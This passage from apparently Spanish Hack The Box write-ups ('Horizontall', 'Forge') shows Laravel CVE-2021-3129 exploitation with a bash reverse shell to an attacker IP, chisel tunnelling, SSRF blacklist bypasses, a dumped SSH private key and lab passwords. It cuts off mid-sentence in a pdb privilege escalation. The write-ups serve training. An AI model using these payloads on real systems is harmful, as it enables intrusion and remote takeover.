Jul 29 04:24 .. drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 development drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:24 production drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 staging strapi@horizontall:~/myapi$ ls -la config/environments/development/ total 32 drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 . drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 .. -rw-r--r-- 1 strapi strapi 135 May 26 14:31 custom.json -rw-rw-r-- 1 strapi strapi 351 May 26 14:31 database.json -rw-r--r-- 1 strapi strapi 439 May 26 14:31 request.json -rw-r--r-- 1 strapi strapi 164 May 26 14:31 response.json -rw-r--r-- 1 strapi strapi 529 May 26 14:31 security.json -rw-r--r-- 1 strapi strapi 159 May 26 14:31 server.json strapi@horizontall:~/myapi$ cat config/environments/development/database.json { \"defaultConnection\": \"default\", \"connections\": { \"default\": { \"connector\": \"strapi-hook-bookshelf\", \"settings\": { \"client\": \"mysql\", \"database\": \"strapi\", \"host\": \"127.0.0.1\", \"port\": 3306, \"username\": \"developer\", \"password\": \"#J!:F9Zt2u\" }, \"options\": {} } } }  Desafortunadamente, no hay nada que hacer aquí, ya que la contraseña de admin se cambió con el exploit anterior y no hay más bases de datos aparte de strapi:\nWelcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 12 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | strapi | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql quit Bye  Aquí debemos recordar que vimos un archivo PHP y un proyecto en /home/developer. Entonces, podemos realizar un escaneo de puertos interno mediante un simple script en Bash:\nstrapi@horizontall:~/myapi$ cd /tmp strapi@horizontall:/tmp$ echo -e '#!/bin/bash\\n\\nfor i in $(seq 1 65535); do\\n timeout 1 echo 2\u0026gt;/dev/null  /dev/tcp/127.0.0.1/$i \u0026\u0026 echo \"Port $i: open\" \u0026\\ndone; wait'  .scan.sh strapi@horizontall:/tmp$ chmod +x .scan.sh strapi@horizontall:/tmp$ cat .scan.sh  #!/bin/bash for i in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$i \u0026amp;\u0026amp; echo \"Port $i: open\" \u0026amp; done; wait  strapi@horizontall:/tmp$ ./.scan.sh Port 22: open Port 80: open Port 1337: open Port 3306: open Port 8000: open Port 57900: open  Una manera más sencilla de ejecutar puertos abiertos es mediante netstat:\nstrapi@horizontall:/tmp$ netstat -nat | grep LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN  Y vemos que hay más puertos que no están expuestos (y por tanto, no reportados por nmap).\nEl puerto 1337 contiene la página web de http://api-prod.horizontall.htb, porque así se encuentra configurado el servidor nginx:\nstrapi@horizontall:/tmp$ cat /etc/nginx/sites-enabled/horizontall.htb server { # server block for 'horizontall.htb' domain listen 80; listen [::]:80; server_name horizontall.htb www.horizontall.htb; root /var/www/html/horizontall; index index.html index.htm; location / { try_files $uri $uri/ =404; } } server { listen [::]:80; listen 80; server_name api-prod.horizontall.htb; location / { proxy_pass http://localhost:1337; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } server { # server block for all the other requests # this block will be a default server block listening on port 80 listen 80 default_server; listen [::]:80 default_server; # close the connection immediately return 301 http://horizontall.htb; }  Escalada de privilegios Aquí podemos comprobar que http://localhost:8000 contiene una página web hecha en Laravel (un framework de PHP):\nstrapi@horizontall:/tmp$ curl -I 127.0.0.1:8000 HTTP/1.1 200 OK Host: 127.0.0.1:8000 Date: Connection: close X-Powered-By: PHP/7.4.22 Content-Type: text/html; charset=UTF-8 Cache-Control: no-cache, private Set-Cookie: XSRF-TOKEN=eyJpdiI6IkRsV2pwUEV3Q20zVlFQZzh4Y2JlblE9PSIsInZhbHVlIjoibkdhcjM0U2pNTWErUXQzUkdUSDZWL2FiZnIvS2J2cjFEWGlYRjBvZEdDZElZZGt4OGJOUnhVdWJXdndiL2ZnSXNiZWI3ejl2dXczVVdXT1JKQ0h6TDllUy95RzBhRE1qSDRaYmZmWlBkTGNVbHhXUDIwT2xHM1pyN0huQ3BrNlUiLCJtYWMiOiI1NjYxZGM2NWFiZGNhMWNmZmIwMGQwMzZhZjYzZTkyYTgzNGY2ZWJkYTdlYmQ4OGVjZTBlYmNmYjY3ZGM3MGNkIn0%3D; Max-Age=7200; path=/; samesite=lax Set-Cookie: laravel_session=eyJpdiI6IlkyV3AxWUZ3U3ozL0RnTkNwalQ2SWc9PSIsInZhbHVlIjoialFWbE00dzNCa01yeXUxaEU4c08ydU05M1F4WHUzbFp3eUNDLzNFVWNXcGd0YVM4SW9FTHdkVW4xR2Z0V3lxeWx1d2taMFMvdFV5SThDVWNTcFdkT3dXZVBBcnVMS2FuVmlXdTI3aFFVNWF6b0hVYzJYdThZSmJiZmJXQ1ZxNXkiLCJtYWMiOiI3MTI0NTk1ZDE5NzE4N2YwYzAwM2MwOWJlY2NiMDFkMmU5YTY2ZTliNWU1MTk4OTAxNmM0YWQ4M2M0YjA5YWRmIn0%3D; Max-Age=7200; path=/; httponly; samesite=lax  Reenvío de puertos En este punto, será conveniente realizar un reenvío de puertos mediante chisel para acceder al puerto 8000 desde la máquina de atacante:\n$ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:8000=8000: Listening  strapi@horizontall:/tmp$ curl 10.10.17.44/chisel -o .chisel % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2315k 100 2315k 0 0 402k 0 0:00:05 0:00:05 --:--:-- 409k strapi@horizontall:/tmp$ chmod +x .chisel strapi@horizontall:/tmp$ ./.chisel client 10.10.17.44:1337 R:8000:127.0.0.1:8000 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms)  Explotando Laravel Ahora, tenemos acceso a la página web de Laravel desde la máquina de atacante entrando en http://127.0.0.1:8000:\nEsta página dice que se usa Laravel v8 (PHP v7.4.18). De nuevo, podemos encontrar un exploit para esta versión. El que está en ExploitDB no funcionó correctamente, pero existe otro que además viene con explicación disponible aquí (CVE-2021-3129), que tiene un enlace al exploit.\nPrimero, necesitamos clonar un repositorio (aparte del exploit) para disponer de phpggc. Luego, podemos seguir los pasos mostrados en el exploit para conseguir ejecución remota de comandos (RCE).\nComo prueba de concepto, podemos probar a ejecutar el comando id:\n$ git clone https://github.com/ambionics/phpggc $ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system id $ python3 laravel-ignition-rce.py http://localhost:8000 ./exploit.phar + Log file: /home/developer/myproject/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR ! + Phar deserialized -------------------------- uid=0(root) gid=0(root) groups=0(root) -------------------------- + Logs cleared  Y vemos que somos root.\nEntonces, a continuación lanzamos el exploit pero con un comando para conseguir una reverse shell en la máquina:\n$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar --fast-destruct -o ./exploit.phar monolog/rce1 system \"bash -c 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261'\" $ python3 laravel-ignition-rce.py http://localhost:8000 ./exploit.phar + Log file: /home/developer/myproject/storage/logs/laravel.log + Logs cleared + Successfully converted to PHAR !  Y finalmente, conseguimos acceso como root y podemos leer la flag root.txt:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.105. Ncat: Connection from 10.10.11.105:49338. bash: cannot set terminal process group (17432): Inappropriate ioctl for device bash: no job control in this shell root@horizontall:/home/developer/myproject/public# cat /root/root.txt 0d37c358b4147cb69b83ef1aa753655f  ","image":"/images/HTB/Horizontall/Horizontall.png","permalink":"https://7rocky.github.io/htb/horizontall/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE","time":9,"title":"Horizontall"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.111   Fecha: 11 / 09 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.111 -p21,22,80 Nmap scan report for forge.htb (10.10.11.111) Host is up (0.075s latency). PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.24 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP). El puerto 21 (FTP) está filtrado.\nEnumeración web Si vamos a http://10.10.11.111, la máquina contiene una página web que redirige a http://forge.htb. Después de ponerlo en /etc/hosts, vemos esta página:\nLa web nos permite subir imágenes al servidor como archivo o como URL:\nSi ponemos una URL que apunte a nuestra máquina de atacante, nos llega una petición:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.111 - - [] \"GET /Forge.png HTTP/1.1\" 200 -  Y el servidor genera una URL aleatoria para servir nuestra imagen:\nTambién es posible subir archivos que no sean imágenes. Por ejemplo, este documento HTML:\n\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"uft-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Test\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Aunque el navegador se quejará de que el archivo no es una imagen, utilizando curl podemos ver el documento HTML subido:\n$ curl http://forge.htb/uploads/lquBPTyay70DnGJwpCFG \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;meta charset=\"uft-8\"\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Test\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Probando SSRF Ahora, podemos probar algunos payloads para probar un Server-Side Request Forgery (SSRF), ya que parece vulnerable (de hecho, la máquina se llama \u0026ldquo;Forge\u0026rdquo;). Para automatizar el proceso, podemos utilizar este corto script en Python: ssrf.py (explicación detallada aquí). Este script solamente pone la URL de la imagen y accede a la URL generada.\nSi probamos algunas URL típicas, veremos que hay una lista negra:\n$ python3 ssrf.py http://forge.htb URL contains a blacklisted address! $ python3 ssrf.py http://localhost URL contains a blacklisted address! $ python3 ssrf.py http://127.0.0.1 URL contains a blacklisted address!  Aunque esta lista negra se puede saltar poniendo http://10.10.11.111 o http://127.0.1.1, no hay nada interesante que hacer.\nComo curiosidad, el servidor Apache no incluye una barra al final al realizar la redirección, y sale este error:\n$ python3 ssrf.py http://10.10.11.111/static An error occured! Error : HTTPConnectionPool(host=\u0026#39;forge.htbstatic\u0026#39;, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(\u0026#39;\u0026lt;urllib3.connection.HTTPConnection object at 0x7f67f9ede100\u0026gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution\u0026#39;))  Utilizando curl, podemos ver que el problema está en el proceso de redirección:\n$ curl -I http://10.10.11.111/static HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://forge.htbstatic Content-Type: text/html; charset=iso-8859-1  Esto se puede solucionar añadiendo :80, de manera que se añada a http://forge.htb:\n$ curl -I 'http://10.10.11.111/:80/static' HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Location: http://forge.htb:80/static Content-Type: text/html; charset=iso-8859-1 $ python3 ssrf.py http://10.10.11.111/:80/static \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\" \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Index of /static\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Index of /static\u0026lt;/h1\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/blank.gif\" alt=\"[ICO]\"\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=N;O=D\"\u0026gt;Name\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=M;O=A\"\u0026gt;Last modified\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=S;O=A\"\u0026gt;Size\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;\u0026lt;a href=\"?C=D;O=A\"\u0026gt;Description\u0026lt;/a\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th colspan=\"5\"\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/back.gif\" alt=\"[PARENTDIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Parent Directory\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"css/\"\u0026gt;css/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-27 04:00 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"images/\"\u0026gt;images/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-31 10:31 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td valign=\"top\"\u0026gt;\u0026lt;img src=\"/icons/folder.gif\" alt=\"[DIR]\"\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\"js/\"\u0026gt;js/\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt;2021-05-27 06:39 \u0026lt;/td\u0026gt;\u0026lt;td align=\"right\"\u0026gt; - \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th colspan=\"5\"\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at forge.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;  Como dijimos antes, no hay nada más que ver en http://forge.htb. Podemos intentar acceder al servidor FTP, pero no está permitido:\n$ python3 ssrf.py ftp://forge.htb Invalid protocol! Supported protocols: http, https  Encontrando otro subdominio Por tanto, tiene que haber otro subdominio. Podemos buscarlo con gobuster:\n$ gobuster vhost -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -r -q -u forge.htb Found: admin.forge.htb (Status: 200) [Size: 27]  Después de ponerlo en /etc/hosts, vemos que solo permite acceso desde localhost:\n$ curl http://admin.forge.htb/ Only localhost is allowed!  Por tanto, necesitamos utilizar SSRF para acceder a http://admin.forge.htb, pero vemos que está en la lista negra:\n$ python3 ssrf.py http://admin.forge.htb URL contains a blacklisted address!  Aunque no esté permitida, parece que la validación no es muy exhaustiva, ya que no comprueba letras mayúsculas:\n$ python3 ssrf.py http://ADMIN.FORGE.HTB \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Admin Portal\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\"\"\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right margin-right\"\u0026gt;\u0026lt;a href=\"/announcements\"\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right\"\u0026gt;\u0026lt;a href=\"/upload\"\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Welcome Admins!\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  De esta forma, podemos ver el contenido del subdominio interno admin.forge.htb. Vemos que hay una ruta llamada /announcments:\n$ python3 ssrf.py http://ADMIN.FORGE.HTB/announcements \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Announcements\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u0026gt; \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\"\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\"\"\u0026gt;\u0026lt;a href=\"/\"\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right margin-right\"\u0026gt;\u0026lt;a href=\"/announcements\"\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\"align-right\"\u0026gt;\u0026lt;a href=\"/upload\"\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026lt;url\u0026gt;.\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Acceso a la máquina Ahora tenemos otra manera de realizar SSRF, pero desde http://admin.forge.htb y teniendo FTP habilitado (con credenciales user:heightofsecurity123!):\n$ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/' drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Sep 12 13:01 user.txt $ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt' 65d1bd86e04e41ae808a7965ff6e07c5  Ahora podemos comprobar si la contraseña se reutiliza para el servicio SSH\n$ ssh user@forge.htb user@forge.htb: Permission denied (publickey).  Pero no, necesitamos una clave privada para acceder por SSH.\nEl servidor FTP parece que está apuntando al directorio personal de user (ya que pudimos ver la flag user.txt). Por tanto, podemos intentar acceder a ~/.ssh/id_rsa:\n$ python3 ssrf.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa' | tee id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY-----  Escalada de privilegios con sudo Y ahora tenemos acceso a la máquina. Este usuario puede ejecutar un script en Python como usuario root:\n$ chmod 600 id_rsa $ ssh -i id_rsa user@forge.htb user@forge:~$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py  El script abre un socket para permitir a ciertos usuarios ejecutar comandos a nivel de sistema:\nuser@forge:~$ cat /opt/remote-manage.py  #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:{port}') (clientsock, addr) = sock.accept() clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit()  Los comandos no son vulnerables. Sin embargo, la vulnerabilidad está en el uso de pdb si se lanza una excepción. Una vez que tengamos acceso a la interfaz de pdb, podremos ejecutar una sesión de Python interactiva (REPL) como root (ya que el script se ejecuta con 